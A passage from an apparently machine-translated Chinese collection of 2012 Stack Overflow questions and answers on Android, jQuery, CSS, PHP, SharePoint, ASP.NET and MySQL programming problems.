            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="@string/ir" />

   </LinearLayout> 
```

清单.XML：

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.example.databasedemo"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk
    android:minSdkVersion="8"
    android:targetSdkVersion="15" />

<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" >
    <activity
        android:name=".MainActivity"
        android:label="@string/title_activity_main" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
</application> 
```

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T06:51:22.393

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.example.databasedemo"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk
android:minSdkVersion="8"
android:targetSdkVersion="15" />

<application
     android:icon="@drawable/ic_launcher"
     android:label="@string/app_name"
     android:theme="@style/AppTheme" >
     <activity
         android:name=".DataBaseDemoActivity"
         android:label="@string/title_activity_main" >
         <intent-filter>
             <action android:name="android.intent.action.MAIN" />

             <category android:name="android.intent.category.LAUNCHER" />
         </intent-filter>
     </activity>
 </application> 
```

请更换

```
android:name=".MainActivity" 
```

至

```
android:name=".DataBaseDemoActivity" 
```

我已经写了上面的解决方案请找到它..

# jquery - 如何使用highcharts而不是图像使用jquery mobile制作像应用程序一样的照片库？

> ID：12328491
> 
> 赞同：0
> 
> 时间：2012-09-08T06:08:20.680
> 
> 标签：jquery, html, mobile, highcharts

大家好，我正在使用 jquery mobile 在移动网站上工作，看到许多与 jquery mobile 集成的照片库示例尝试了其中的大多数，并且效果很好。我的问题是我需要在画廊内使用 highcharts 而不是图像。是否有任何插件，或者这甚至可以通过 jquery mobile 实现？

提前谢谢各位！

注意：我不会将移动网站转换为原生应用程序。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T06:53:46.553

highchart 所需要的只是一个 div/element 供其自身渲染。从理论上讲，您应该能够将其放入任何照片库。您应该注意的一件事是，高图表取决于 DOM，因此只能在图库加载到 DOM 后添加。

# android - SQLiteException 说没有这样的表，而现有的 dbhelper

> ID：12328493
> 
> 赞同：-1
> 
> 时间：2012-09-08T06:09:20.087
> 
> 标签：android, android-sqlite

我阅读了所有其他“SQLiteException no such table”消息，但没有找到我的观点的答案。

我正在创建一个在数据库中有多个表的 android 应用程序。我一步一步地构建它。我创建了第一个表 A，以及一个用于添加/编辑数据的表单。我用 LoaderThrottle android 示例启发了自己。它工作得很好。在此之后，我创建了与表 A 完全相同的表 B，以及一个用于添加数据的表单。

然后我看到我忘记了表 B 中的一个字段。我试图添加这个字段并将表 B 切换到版本 2。但是我遇到了很多问题。“降级”和“升级”错误......所以我删除了应用程序数据并从设备上卸载了应用程序，因此数据库在首次启动时被删除并重新创建。

但是现在，当我启动应用程序时，出现异常 << android.database.sqlite.SQLiteException: no such table: A: , while compile: SELECT name, _id FROM A WHERE ((active = 1 ))>> ？ ！？

为什么 dbHelper 不创建数据库？我必须显式调用它的 onCreate 方法吗？我需要为所有数据库表使用唯一的 dbHelper，还是为每个表需要一个 dbHelper（我现在拥有的）？

更多信息： - 在清单中，我有两个提供者，链接到每个表的内容提供者。

编辑：这是每个表的创建代码。

表A（我有例外）：

```
 public void onCreate(SQLiteDatabase db) {
       db.execSQL("CREATE TABLE " + ActivityTable.TABLE_NAME + " ("
               + ActivityTable._ID                + " INTEGER PRIMARY KEY, "
               + ActivityTable.COLUMN_NAME_TITLE  + " TEXT NOT NULL, "
               + ActivityTable.COLUMN_NAME_CODE   + " TEXT, "
               + ActivityTable.COLUMN_NAME_ACTIVE + " smallint NOT NULL  DEFAULT 1, "
               + ActivityTable.COLUMN_NAME_CPTI   + " smallint NOT NULL  DEFAULT 1 "
               + ");");
   } 
```

表 B：

```
 public void onCreate(SQLiteDatabase db) {
       db.execSQL("CREATE TABLE " + TrackTable.TABLE_NAME + " ("
               + TrackTable._ID                     + " INTEGER PRIMARY KEY, "
               + TrackTable.COLUMN_NAME_DATE        + " long NOT NULL, "
               + TrackTable.COLUMN_NAME_ACTIVITY_ID + " int NOT NULL DEFAULT 0, " 
               + TrackTable.COLUMN_NAME_DAYPART     + " smallint NOT NULL  DEFAULT 0, "
               + TrackTable.COLUMN_NAME_NPQ         + " smallint NOT NULL  DEFAULT 0, " 
               + TrackTable.COLUMN_NAME_NBPID       + " long NOT NULL  DEFAULT 0 " 
               + ");");
   } 
```

提前感谢您提供任何线索。弗洛朗

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-24T20:43:55.470

经过多次尝试，我终于摆脱了困境。

我给你我的解决方案，即使我真的不明白为什么我必须这样做。由于我的问题没有答案，因此有一天它可以帮助某人。

作为提醒，我从 LoaderThrottle android 示例开始。请参考这个文件。

在从 SQLiteOpenHelper 派生的子类的 onCreate 方法中，我更改：

```
db.execSQL("CREATE TABLE " + ... 
```

经过 ：

```
db.execSQL("CREATE TABLE IF NOT EXISTS " + ... 
```

然后，在 ContentProvider 派生的子类的 onCreate 方法中，我直接调用 DbHelper 的 onCreate 方法：

```
 /**
     * Perform provider creation.
     */
    @Override
    public boolean onCreate() {
        mOpenHelper = new ActivityDbHelper(getContext());
        // Assumes that any failures will be reported by a thrown exception.

        SQLiteDatabase db = mOpenHelper.getWritableDatabase();
        mOpenHelper.onCreate(db);

        return true;
    } 
```

享受，弗洛伦特

# lua - event.phase 不工作电晕

> ID：12328502
> 
> 赞同：1
> 
> 时间：2012-09-08T06:11:23.893
> 
> 标签：lua, transition, coronasdk, touch-event

当我在主文件中运行时，我的代码运行顺利，但是当我在其他一些 lua 文件中编写此代码并在director.lua 的帮助下调用该文件时，它无法识别触摸时结束的事件阶段。请帮帮我。提前致谢。这是我的代码。

```
 function touched( event )
        if  event.phase == "ended"  then
        if(event.x - event.xStart > 30)then
           sliding = true;
           line = display.newLine(event.xStart, event.yStart, event.x, event.y)
           line:setColor(255,0,0)
           line.width = 5

          else

            print("just a touch")

          end

       end
    end
   Runtime:addEventListener("touch", touched , -1) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-11T16:48:18.450

I just tested this using Director with a standard Director main.lua file and a scene1.lua file containing only your code from the above post and it worked just fine.

You could provide more code, upload a zip of your project or share any notes about your project that may help figure out why this would be happening.

I would suggest you create a basic app as I just did and try running that; if the issue persists you could file a bug, although as I said above event phases are working fine for me.

# jquery - 使用 jQuery（注入）addClass 到动画 Javascript 滑块？

> ID：12328503
> 
> 赞同：0
> 
> 时间：2012-09-08T06:11:26.440
> 
> 标签：jquery, dom, reflection, selector, addclass

我的主页上有一个基于 Javascript 的图像滑块，我从一些开源网站中提取了它。它非常适合我需要它做的事情。但是，我想使用[反射](http://www.digitalia.be/software/reflectionjs-for-jquery).js 脚本在图像下方添加反射。要插入反射，我需要将“反射”类添加到我的 img 元素中。为此，我需要使用外部 .js 文件将类添加到轮播中的图像中。

到目前为止我所拥有的是：`$('div.skin-default img').addClass("reflect");`但我认为它只是试图在 DOM 负载上添加它。由于图像是动态切换的（在任何给定时间仅预加载 2 个），因此在加载 DOM 时，该类不会添加到轮播中的其他图像中。是这里的问题吗？如果是这样，我如何告诉 jQuery 继续检查新的图像元素并自动添加“反射”类？我对 jQuery 还是很陌生。

另外，我使用 Drupal 7 作为我的网站，使用 Galleria 作为图像滑块插件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T06:27:31.223

在添加新元素后修补`$('div.skin-default img').addClass("reflect");`到滑块脚本中，作为回调（如果脚本配置为接受回调）或程序上（在下一行）。

或者，您可以挂钩由附加触发的 DOM 突变事件。如果您需要支持旧版浏览器，请查看[此插件。](https://github.com/jollytoad/jquery.mutation-events)

# maven - release:prepare 不在子模块中执行

> ID：12328504
> 
> 赞同：1
> 
> 时间：2012-09-08T06:11:40.497
> 
> 标签：maven, maven-release-plugin

我有一个包含两个模块的父项目。在我的父母 pom 我有：

```
<plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-release-plugin</artifactId>
            <version>2.2.2</version>
            <configuration>
                <autoVersionSubmodules>true</autoVersionSubmodules>
                <useReleaseProfile>true</useReleaseProfile>
                <releaseProfiles>complete</releaseProfiles>
            </configuration>
</plugin> 
```

在我的第一个模块 pom 中：

```
<plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-release-plugin</artifactId>
            <configuration>
                <preparationGoals>clean replacer:replace scm:checkin</preparationGoals>
            </configuration>
</plugin> 
```

我的问题：当我在我的父 pom 中运行**mvn release:prepare时，我的第一个模块 pom 中的***prepareGoals*将不会执行。我应该怎么做才能在我的第一个模块中执行*preparationGoals ？*（*replacer*和*scm*插件存在于我的第一个模块 pom 中）

# java - 如何在javafx中使用从右到左

> ID：12328508
> 
> 赞同：1
> 
> 时间：2012-09-08T06:12:30.150
> 
> 标签：java, javafx

> **可能重复：**
> [Javafx 2.0 阿拉伯文本顺序不正确](https://stackoverflow.com/questions/9910890/javafx-2-0-arabic-text-incorrect-order)

我在 Swing java 中从右到左使用 setcomponentorientation 方法。

如何在javafx中使用从右到左的阿拉伯语语言？
如何在 javafx 中使用阿拉伯字体？

# jquery - 使用jQuery改变整个wordpress网站的CSS

> ID：12328509
> 
> 赞同：0
> 
> 时间：2012-09-08T06:12:39.897
> 
> 标签：jquery, html, css, wordpress

我环顾四周，找不到解决这个问题的简单方法。我创建了一个自定义文字新闻主题（我的第一次），它运行良好。我已经将它连接到一个简单的 jQuery 文件，该文件在页面加载时播放一个简短的动画并更改 CSS 并在按下某些按钮时执行一些额外的动画。这是一个简单的日/夜主题，效果很好。我在 header.php 中调用该文件。然而，每次按下内部超链接（例如网站的任何页面）时，它都会再次加载整个 jQuery 文件并将 CSS 重置为其原始形式。为了清楚起见，我需要用户单击主页上的某些内容，这将更改页面的 CSS。这是有效的。但是，我需要将其保留在网站上的每个页面中。

有一个简单的解决方案吗？我真的不想使用 cookie/sessionID 或我见过的其他一些复杂的“解决方案”。我的技术能力不是很强。

干杯。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T06:15:19.880

您是否考虑过使用哈希？在 window.location 对象中，您可以将哈希设置为 www.mysite.com/page#night 然后 www.mysite.com/page#day 然后当 DOM 加载后，检查 window.location.hash 属性以看看它是否设置为白天或晚上或什么都没有然后默认为某事。

[http://www.w3schools.com/jsref/prop_loc_hash.asp](http://www.w3schools.com/jsref/prop_loc_hash.asp)

[http://www.w3schools.com/jsref/obj_location.asp](http://www.w3schools.com/jsref/obj_location.asp)

例子：

[http://jsfiddle.net/QV6xa/1/](http://jsfiddle.net/QV6xa/1/)

JSfiddle 不允许我更改 url，但是如果您将这个示例复制/粘贴到其他地方，它应该可以工作。

# html - 奇怪的复选框行为，在不同的浏览器中

> ID：12328511
> 
> 赞同：3
> 
> 时间：2012-09-08T06:13:34.283
> 
> 标签：html, forms, checkbox, cross-browser

在我的联系页面上：http: [//onthemouse.com/contact-us/](http://onthemouse.com/contact-us/) 我有一组复选框，它们在 Firefox 中看起来很完美，表现出一些奇怪的行为（框放大，点击变成灰色，复选标记变小，返回在模糊或单击其他位置时正常），在 Chrome 和 Safari OS X 中根本不显示（根据 browserlabs）。Firefox OS X 似乎只显示点（再次根据 browserlabs）。这些只是简单的复选框，唯一特殊的是`Field[]`它带有括号的 id，因为它用于在发送表单时创建和排列。
复选框代码：

```
 <div style="display:inline;">
    <span>
      <label class="choice" for="Field1" style="display:inline;margin-left:0px;margin-right:5px;">
        <input id="Field1" name="Field[]" type="checkbox" class="field checkbox" value="Web Design" style="width:0px;">Web Design    
 </label>
    </span>
    <span>
      <label class="choice" for="Field2" style="display:inline;margin-left:0px;margin-right:5px;">
        <input id="Field2" name="Field[]" type="checkbox" class="field checkbox" value="Graphic Design" style="width:0px;">Graphic Design
</label>
    </span>
</div> 
```

表格代码： http: [//pastebin.com/E3ExGPvv](http://pastebin.com/E3ExGPvv)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T06:10:08.853

[![](../Images/9b9b6b8ab61ff3fe629d37457fef207b.png)](https://i.stack.imgur.com/MGMsF.jpg) [http://tinypic.com/r/11iiude/6](http://tinypic.com/r/11iiude/6)

您为第二行复选框做了错误的 id 命名。语法错误。时期。

# css - 如何使用 LESS css 排除某些类型的标签

> ID：12328514
> 
> 赞同：1
> 
> 时间：2012-09-08T06:13:46.043
> 
> 标签：css, less

如何`"input:not([type="submit"])"`使用 LESS 进行写作？我认为 CSS 语法不适用于 IE，是否有 LESS 命令可以？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-11T08:04:05.857

我不这么认为。LESS 不能比纯 CSS 做更多的事情——它只是写起来更方便。作为一种解决方法，直到*没有：*可用，您可以使用类似的东西

```
input {
    /* set properties for all input types */
    &[type="submit] {
        /* undo for type submit */
    }
} 
```

# php - FGETCSV 文档缺陷

> ID：12328515
> 
> 赞同：2
> 
> 时间：2012-09-08T06:14:03.557
> 
> 标签：php, fgetcsv

我一直在试图弄清楚`length`参数的`fgetcsv`含义是什么？该文档指出它是：

> 必须大于要在 CSV 文件中找到的最长行（以字符为单位）（允许尾随行尾字符）。它在 PHP 5 中成为可选参数。省略此参数（或在 PHP 5.0.4 及更高版本中将其设置为 0）最大行长度不受限制，速度稍慢。

这没有努力解释`length`资源的具体用途。它只是提供有关要求的信息。

有人可以告诉我这是做什么的。谷歌没有帮助。我认为这是让我只读取 csv 文件第一行的关键，但我不确定。我尝试用值测试它，`1`但它仍然返回一个完整的行数组。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-08T06:17:56.803

这是您读取的每一行的长度限制，如果您将长度设置为 1000，则意味着您每行只能读取 1000 个字节的数据。

# css - 如何将标签与水平输入和垂直输入内联

> ID：12328518
> 
> 赞同：1
> 
> 时间：2012-09-08T06:14:18.183
> 
> 标签：css, html

我的问题是我不能将标签与水平输入和垂直输入内联

我希望有这样的输出：

![在此处输入图像描述](../Images/55091a806f406f6e68a1f966d7b3d333.png)

但我在这上面使用了一张桌子。现在我不想使用表格，但我不知道该怎么做。我试着做，但这是非常错误的。

这是我的CSS

```
 article#login, article#register {
    padding:5px 0 5px;
    border:1px solid black;
    width:200px;
    margin:0 auto;
} 
```

这是我的html

```
<section id="siteContent" class="tabs">
    <h1>Section</h1>
    <article id="login">
        <h1>Login</h1>
        <label>E-mail:</label>
        <input type="email">
        <label>Password:</label>
        <input type="password">
        <input type="button" value="Login">
    </article>
    <article id="register">
        <h1>Register</h1>
        <label>Name:</label>
        <input type="text">
        <label>E-mail:</label>
        <input type="email">
        <label>Password:</label>
        <input type="password">
        <label>Re-type:</label>
        <input type="password">
    </article>
</section> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T06:36:33.677

~~据我所知，没有表格就没有真正的方法来实现水平和垂直对齐。~~（@TimMedora 刚刚证明我是错误的）但是，如果您希望输入框与标签出现在同一行，您将需要调整它们的大小。它们目前比您的盒子大，因此会被其他元素推来推去。但是，一旦这样做，您仍然需要应用以下 css（或类似的东西），以便您的元素保持在各自的行上：

```
label {
    display: inline-block;
} 
```

[**演示**](http://jsfiddle.net/YWyar/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T06:36:28.643

为什么不把你的`label`and包裹在这样`input`的`p`标签内

```
<article id="login">
        <h1>Login</h1>
    <p>
        <label>E-mail:</label>
        <input type="email">
    </p>

    <p>   
        <label>Password:</label>
        <input type="password">
    </p>       
        <input type="button" value="Login">
    </article>​ 
```

然后使用`CSS`修复对齐。

**[看演示](http://jsfiddle.net/mZXf6/)**

我希望它有所帮助。

# c# - 展开循环和 CalendarDate:Event EndDate 不为循环事件自动计算

> ID：12328519
> 
> 赞同：3
> 
> 时间：2012-09-08T06:14:44.467
> 
> 标签：c#, sharepoint-2010, calendar, recurring

我已完成以下代码以将重复条目保存到名为`Bookings`.

```
 SPSite site = new SPSite(SPContext.Current.Web.Url);
    using (SPWeb web = site.OpenWeb())
    {
        SPList list = web.Lists["Bookings"];
        SPListItem recEvent = list.Items.Add();
        try
        {
            recEvent["EventDate"] = startdate;//11/09/2012 08:00:00
            recEvent["EndDate"] = enddate;//11/09/2012 08:30:00
            recEvent["Booking_x0020_Title"] = Convert.ToString(txtTitle.Text);
            recEvent["Title"] = Convert.ToString(txtTitle.Text);
            recEvent["RecurrenceData"] = Recur_Xml.ToString();//ReccurrenceRule
            recEvent["fRecurrence"] = "True";
            recEvent["EventType"] = 1;
            recEvent["UID"] = System.Guid.NewGuid();
            recEvent["TimeZone"] = 0;
            recEvent["Recurrence"] = -1;
            recEvent["XMLTZone"] = "<timeZoneRule><standardBias>-330</standardBias><additionalDaylightBias>-60</additionalDaylightBias></timeZoneRule>";

            recEvent.Update();
        }
        catch (Exception er)
        {

        } 
```

如果我使用 Recurrence 规则保存以上内容，`Repeat every 1 day for 10 occurences`则项目被正确保存并且当前事件视图显示所有实例，但是在获取 Recurring 条目时，我只得到 1 个结果，即在开始日期。以下是检索循环值的代码：

```
SPWeb oWeb = SPContext.Current.Web;
                SPList oListBookings = oWeb.Lists.TryGetList("Bookings");
SPQuery oQueryBookings = new SPQuery();

                            string strQuery = "";
    strQuery = @"<Where><DateRangesOverlap><FieldRef Name='EventDate' /><FieldRef Name='EndDate' /><FieldRef Name='RecurrenceID' /><Value Type='DateTime'><Today /></Value></DateRangesOverlap></Where>";
                            oQueryBookings.ExpandRecurrence = true;
                            oQueryBookings.Query = strQuery;
                            oQueryBookings.CalendarDate = date;
    SPListItemCollection oCollBookings = oListBookings.GetItems(oQueryBookings); 
```

结果仅在`oQueryBookings.CalendarDate = date;`等于时显示`11/09/2012 08:00:00`，并且在此之后它不会返回任何日期项目，即使这些日期的实例存在，直到`19/09/2012 08:00:00`

如果我在保存项目时将其设置为，则查询将返回所有`recEvent["EndDate"]`项目`19/09/2012 08:00:00`。我希望在用户表单 ( ) 上将重复项目的 EndDate 设置为同一天，`no user would want to calculate the last date of his occurence for recurring pattern with no end date`并且它应该在保存时自动计算。这怎么可能？

如果我使用 sharepoint UI 进行条目，则即使将其设置为同一天并且如果它是重复条目，也会自动计算此结束日期。

请指导我哪里出错了？是在保存时还是在获取记录时？还是因为`EndDate`与 的日期相同`StartDate`？请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T13:27:36.097

检查“ **fRecurrence** ”和“ **Recurrence** ”字段。您可以尝试使用“1”而不是“True”，但我不确定“Recurrence”== -1。你能澄清一下这是什么意思吗？

还有一个想法。您可以使用 SharePoint 站点创建重复事件来测试您的第二部分代码。

据我所知，对于**没有结束日期**的重复事件，“EndDate”是几年后的计算日期。因此，如果您的代码正确，要处理重复事件，您应该通过附加额外的年份来更新“EndDate”。

# openid - 为同一用户处理来自不同 OpenId 提供者的多个 OpenId 登录

> ID：12328520
> 
> 赞同：0
> 
> 时间：2012-09-08T06:14:53.513
> 
> 标签：openid

假设我有一个[示例](http://www.example.com)帐户，我曾经通过 OpenId 登录，因此它只有一个我的个人资料。如果我从与之前的 OpenId 提供者不同的另一个 OpenId 提供者登录，现在会有我的重复资料吗？OpenId 是如何处理这种歧义的，还是由那个网站来处理这种歧义？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T15:00:33.757

OpenID 规范没有为此场景定义任何机制。这完全取决于网站开发人员来处理这个问题。

# facebook - 登录 facebook 错误

> ID：12328528
> 
> 赞同：0
> 
> 时间：2012-09-08T06:15:59.397
> 
> 标签：facebook, facebook-javascript-sdk

我正在开发具有 facebook 登录的网络应用程序。我在具有相同 appID 的单独页面中使用 facebook 登录 2 次，为什么因为如果用户使用我们的登录然后获取他/她的 fb 好友列表，要求用户在那里进行 fb 登录. 我得到 fb.init 已经在 1 页中被称为错误。我已经尝试了堆栈溢出中给出的所有解决方案。仍然收到相同的错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T06:22:23.323

为什么不使用该[`FB.getLoginStatus()`函数](https://developers.facebook.com/docs/reference/javascript/FB.getLoginStatus/)而不是再次初始化 SDK -

> FB.getLoginStatus 允许您确定用户是否登录到 Facebook 并验证了您的应用程序。用户有三种可能的状态：
> 
> *   用户已登录 Facebook 并已验证您的应用程序（已连接）
> *   用户已登录 Facebook，但尚未验证您的应用程序 (not_authorized)
> *   用户此时未登录 Facebook，因此我们不知道他们是否已验证您的应用程序（未知）

这三个选项**以及您用来**在系统中验证用户身份的任何机制都应该涵盖有关使用 Facebook 进行身份验证的所有场景。

要检查用户当前状态，您可以使用一些类似于此的代码 -

```
FB.getLoginStatus(function(response) {
  if (response.status === 'connected') {
    // logged in and authenticated 
    var fbid = response.authResponse.userID;
    var accessToken = response.authResponse.accessToken;
  } else if (response.status === 'not_authorized') {
    // logged but not authorized
  } else {
    // the user isn't logged in to Facebook.
  }
}); 
```

# php - 动态启用/禁用来自控制器的输入文本

> ID：12328529
> 
> 赞同：0
> 
> 时间：2012-09-08T06:16:07.383
> 
> 标签：php, javascript, codeigniter

我是 PHP 新手，我正在使用 CI :D 现在我的控制器中有一个视图`user_form_v`及其控制器`user` ，我尝试传递一个字符串变量名`$validate`，我将使用 javascript 在我的视图中验证它，所以如果`$validate == add`我将启用我的输入文本. 这是我的 javascript（不工作）：

```
<script type="text/javascript">
        function validation(){
            var temp = <?php echo $validate?>
            if (temp == "add")document.getElementById("id").disable = false;
        }
    </script> 
```

这是我的输入文本，默认为 DISABLED ：

```
<input id="id" type="text" name="ID_user" class="text" disabled="disable"
                value="<?php echo (isset($user['ID_user']))?$user['ID_user']:""?>"/> 
```

**回答：** 根据选择的答案，这里不需要 Javascript（对不起，我是菜鸟）所以我们需要做的就是添加这个：`<?php if($validate!='add'){echo "disabled";} ?>`这样，如果他们选择更新，我的输入文本将被禁用。 **但是它不能使用`disabled="disabled"`**（我不知道为什么）所以这是动态输入文本的最终代码：`<input type="text" name="ID_user" class="text" <?php if($validate!='add'){echo "disabled";} ?> value="<?php echo (isset($user['ID_user']))?$user['ID_user']:""?>"/>`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T06:25:54.410

## 在您的 javascript 中：

*   `.disabled`不是`.disable`
*   将您的 PHP 用引号括起来。
*   你在打电话`validation()`吗？否则，此代码将永远不会执行。

## 在您的 html 中：

`disabled="disabled"`不是`disabled="disable"`

## 评论后更新：

你确定这里甚至需要 javascript*吗*？我的意思是，您似乎允许客户端做出服务器乐意做的决定。

`<input id="id" type="text" name="ID_user" class="text" value="<?= $user['ID_user']?>" <? if($validate!=='add'){echo "disabled";} ?>/>`

并将javascript全部废弃。（我挂断了你的`isset()`电话，如果你真的需要，把它扔回去）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-08T06:18:44.633

在它周围加上引号

```
var temp = "<?php echo $validate ?>"; 
```

所以它会导致

```
var temp = "add"; 
```

并不是

```
var temp = add; // Error: undefined variable add 
```

# android - android webview相关

> ID：12328530
> 
> 赞同：4
> 
> 时间：2012-09-08T06:16:17.367
> 
> 标签：android, webview, android-webview, webviewclient

我有多个 html 文件保存在 assets 文件夹中。我的 html 文件之一是：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
<style type="text/css">
    .outer{width:300px; height:460px; padding:10px;}
</style>
</head>

<body>
<div class="outer">
    <h4 style="text-align:right; margin-bottom:30px; width:300px;"><a href="#0">HOME</a></h4>
    <h1>World Map -01</h1>
    <img src="world_map.png" width="300" alt="" />
    <h4 style="text-align:right; margin-top:30px; width:300px;"><a href="#2">NEXT</a></h4>
</div>
</body>
</html> 
```

还有 3 个 html 文件与此相同。将加载第一页。在这里，我想通过检查 href 来获取 href 并手动加载链接。

我的代码是：

```
public class WebvwActivity extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        WebView web=(WebView) findViewById(R.id.web);
        web.getSettings().setJavaScriptEnabled(true);
        web.loadUrl("file:///android_asset/demo.html");
}
} 
```

**我想通过检查href值来获取href值并加载链接？**

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T06:24:20.343

尝试使用以下方法之一以正常方式运行它：

```
<li><a href="testing2.html" data-transition="none" rel="external">testing2</a></li> 
```

并将您的 testing2.html 文件放在 www 文件夹中

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T06:28:39.150

您可以为此使用 webview 的 WebViewClient。有一个函数[shouldOverrideUrlLoading](http://developer.android.com/reference/android/webkit/WebViewClient.html#shouldOverrideUrlLoading%28android.webkit.WebView,%20java.lang.String%29)可用于检测 href 值并可以相应地对其进行操作。

# c# - 如何将项目模板文本框从gridview保存到数据库

> ID：12328532
> 
> 赞同：1
> 
> 时间：2012-09-08T06:16:40.347
> 
> 标签：c#, asp.net, ado.net

我有一个 gridview，其中包含 2 项模板 1-checkbox 2-textbox，如下所示：

```
<asp:GridView 
    ID="Warehouse_gv" 
    runat="server" 
    AllowPaging="True" 
    align="center" 
    AllowSorting="True" AutoGenerateColumns="False" 
    DataSourceID="Warehouse_gv_SqlDS"
    onselectedindexchanged="Warehouse_gv_SelectedIndexChanged" 
    Width="230px" PageSize="700">

 <Columns>
    <asp:CommandField ShowDeleteButton="False" ShowEditButton="True" />
    <asp:TemplateField HeaderText="Select">
       <ItemTemplate>
            <asp:CheckBox ID="chkSelect" runat="server" />
      </ItemTemplate>

      <HeaderTemplate>
       <input id="chkAll"  
             önclick="javascript:SelectAllCheckboxes(this);" 
             runat="server" type="checkbox" />
      </HeaderTemplate>
    </asp:TemplateField>

    <asp:BoundField DataField="Line Number" 
                    HeaderText="Line Number" ReadOnly="True" 
                    SortExpression="Line Number" />
    <asp:BoundField DataField="Reference" 
                    HeaderText="Reference" ReadOnly="True" 
                    SortExpression="Reference" />
    <asp:BoundField DataField="QTY" HeaderText="QTY"
                    SortExpression="QTY" />

    <asp:TemplateField HeaderText="EditQTY">
      <ItemTemplate>
          <asp:TextBox ID ="test" runat="server" />
     </ItemTemplate>
     <HeaderTemplate>
          EditQTY
     </HeaderTemplate>
    </asp:TemplateField>
   </Columns>
  <EmptyDataTemplate>
    No data could be find!
  </EmptyDataTemplate>
</asp:GridView> 
```

这个网格有 6 列 1-editbutton 2-checkbox(first item template) 3-lineNo 4-reference 5-qty 6-editqty(second item template) 。但是当我想将此gridview中的数据保存到另一个数据库时，对于我放入Item模板字段数据的文本框字段（EditQTY列）不会传输这是我的代码：

```
protected void SAVE_btn_Click(object sender, EventArgs e)
    {
        int C = 0;

        for (int i = 0; i < Warehouse_gv.Rows.Count; i++)
        {
            GridViewRow row = Warehouse_gv.Rows[i];
            bool isChecked = ((CheckBox)row.FindControl("chkSelect")).Checked;

            if (isChecked)
            {
                SqlCommand cmd = new SqlCommand();
                cmd.Connection = new SqlConnection(Class1.CnnStr);
                cmd.CommandText = "insert into WarehousePart values (@Reference,@EditQty)";
                cmd.Connection.Open();
                cmd.Parameters.AddWithValue("@Reference", Warehouse_gv.Rows[i].Cells[3].Text); 
                cmd.Parameters.AddWithValue("@EditQty", Warehouse_gv.Rows[i].Cells[5].Text);
                cmd.ExecuteNonQuery();
                cmd.Connection.Close();
                C = C + 1;
            }
        }
    }. 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T06:35:20.907

您必须使用`FindControl`方法来获取`TextBox`其 ID 为的引用`test`。

```
TextBox test=row.FindControl("test")) as TextBox;

if(test!=null){
  //
} 
```

# mysql - Mysql 加入 - 返回两倍的数字

> ID：12328539
> 
> 赞同：1
> 
> 时间：2012-09-08T06:17:22.607
> 
> 标签：mysql, join

我正在编写一个脚本，其中拍卖应该能够包含多种产品。一个产品有一个正常价格，它是对拍卖中所有产品的总和，然后作为拍卖“包”正常价格返回。

我的问题是，我的测试拍卖的正常价格为 150 美元，但查询返回 300 美元，这意味着我在某处犯了错误。我整晚都在试图找到解决方案 - 但没有成功。有人有线索吗？

```
SELECT 
    a.AuctionName as A_name, 
    c.CategoryName as C_name, 
    a.AuctionEndDate as A_enddate, 
    a.AuctionOfferPrice as A_price, 
    SUM(p.ProductPrice) as A_normalprice, 
    s.StoreName as S_name 
FROM A_Auctions a 
RIGHT JOIN 
    A_Categories c 
    ON c.CategoryID = :category_id 
INNER JOIN 
    P_ProductsAuctions ppa 
    ON ppa.Auct_AuctionID = a.AuctionID 
RIGHT JOIN 
    P_Products p 
    ON p.ProductID = ppa.Prod_ProductID 
RIGHT JOIN 
    P_Attributes pa 
    ON pa.Cate_CategoryID = c.CategoryID 
RIGHT JOIN 
    P_AttributeValues pav 
    ON pa.AttributeID = pav.Attr_AttributeID 
LEFT JOIN 
    S_Stores s ON a.Stor_StoreID = s.StoreID 
WHERE 
    a.Cate_CategoryID = c.CategoryID 
    AND ((pa.InternationalName = 'param1' AND pav.AttributeValue = 'value1') OR (pa.InternationalName = 'param1' AND pav.AttributeValue = 'value2')) 
    AND ((pa.InternationalName = 'param2' AND pav.AttributeValue = 'value1') OR (pa.InternationalName = 'param1' AND pav.AttributeValue = 'value2'))
GROUP BY 
    p.ProductID, a.AuctionID, pa.AttributeID ORDER BY a.AuctionID DESC 
LIMIT 0,20 
```

这是我的表结构：

A_拍卖：

```
AuctionID   int(15)         
AuctionName varchar(256)        
AuctionDescription  text        
AuctionPicture  text        
